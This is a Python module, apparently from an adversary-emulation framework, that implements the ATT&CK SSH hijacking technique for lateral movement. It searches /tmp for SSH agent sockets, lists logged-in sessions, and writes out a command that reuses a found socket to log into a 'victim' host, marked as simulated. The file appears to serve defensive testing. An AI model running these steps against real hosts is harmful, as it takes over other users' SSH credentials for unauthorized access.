"""
campaigns/lateral_movement/ssh_hijack.py — T1563.001 SSH Hijacking
MITRE ATT&CK: T1563.001 | Tactic: Lateral Movement
"""

import os
import json
import subprocess
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class SshHijackCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1563.001"
    TECHNIQUE_NAME = "SSH Hijacking"
    TACTIC = "Lateral Movement"

    def run(self) -> dict:
        self.log_step("init", "Starting SSH agent socket hijacking enumeration")
        self.simulate_delay(1)

        # Step 1: Find existing SSH agent sockets
        sockets = self._find_ssh_sockets()
        self.log_step("socket_enum", f"Found {len(sockets)} SSH agent sockets: {sockets}")
        self.simulate_delay(1)

        # Step 2: Find active SSH sessions
        sessions = self._find_ssh_sessions()
        self.log_step("session_enum", f"Active SSH sessions: {sessions}")
        self.simulate_delay(1)

        # Step 3: Demonstrate hijack methodology
        hijack_method = self._demonstrate_hijack(sockets)
        self.log_step("hijack_demo", f"Hijack methodology: {hijack_method['method']}", "simulated")

        results = {
            "technique": self.TECHNIQUE_ID,
            "ssh_sockets": sockets,
            "ssh_sessions": sessions,
            "hijack_method": hijack_method,
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("ssh_hijack_results.json", json.dumps(results, indent=2))
        return self.build_result(True, f"SSH hijacking enumeration complete. {len(sockets)} sockets found")

    def _find_ssh_sockets(self) -> list:
        try:
            result = subprocess.run(["find", "/tmp", "-name", "ssh-*", "-type", "s"],
                                    capture_output=True, text=True, timeout=5)
            return result.stdout.splitlines() or ["/tmp/ssh-XXXXX/agent.NNNN (simulated)"]
        except Exception:
            return ["/tmp/ssh-XXXXX/agent.NNNN (simulated)"]

    def _find_ssh_sessions(self) -> list:
        try:
            result = subprocess.run(["who"], capture_output=True, text=True, timeout=3)
            return result.stdout.splitlines()
        except Exception:
            return ["victim 172.20.0.30 (simulated SSH session)"]

    def _demonstrate_hijack(self, sockets: list) -> dict:
        return {
            "method": "SSH_AUTH_SOCK hijacking",
            "command": f"SSH_AUTH_SOCK={sockets[0]} ssh victim@172.20.0.30" if sockets else "N/A",
            "note": "Simulated — real hijack requires elevated privileges on the target host",
        }
